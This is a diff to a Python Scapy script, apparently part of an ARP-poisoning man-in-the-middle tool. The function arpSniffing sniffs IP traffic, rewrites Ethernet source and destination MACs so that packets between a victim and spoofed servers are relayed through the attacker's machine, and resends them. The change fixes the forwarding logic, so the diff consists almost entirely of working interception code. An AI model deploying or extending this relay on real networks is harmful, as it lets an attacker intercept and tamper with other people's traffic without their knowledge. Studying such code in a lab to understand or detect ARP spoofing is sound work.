@@ -62,29 +62,31 @@ def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
 
         #lock thread
         lock.acquire()
-        print("I got here")
+        #print("I got here")
         #case 1: victim request an IP which has as destination MAC of attacker
         # find corresponding MAC to that IP in array of spoffed IPs and
         # put as destination to the new packet
-        if pkt[IP].dst in  spoofIP:
-            pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
-        else:
+        if pkt[Ether].dst == attackerMAC :
+            if pkt[IP].dst in  spoofIP:
+                pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
+            else:
             #case 2: server response for the request of the victim
             #so replace destination MAC to the MAC of victim
-            pkt[Ether].dst = victimMAC
+                pkt[Ether].dst = victimMAC
 
-        #put src to attackerMAC as both arp tables of server and victim
-        #maintain requested IP andresses under attacker MAC
-        pkt[Ether].src = attackerMAC
+            #put src to attackerMAC as both arp tables of server and victim
+            #maintain requested IP andresses under attacker MAC
+            pkt[Ether].src = attackerMAC
+
+            # send packet to the network
+            sendp(pkt, iface=networkInterface)
+            print(pkt.show())
         lock.release()
 
-        #send packet to the network
-        sendp(pkt, iface=networkInterface)
 
     #contineously sniff for the arp packet in network with before defined filter
     #on each intercepted packet perform intercep method
     sniff(prn=intercept, iface=networkInterface, filter="ip")
-
 
 # input :
 # - target ip of device for poisoning arp table as array of str
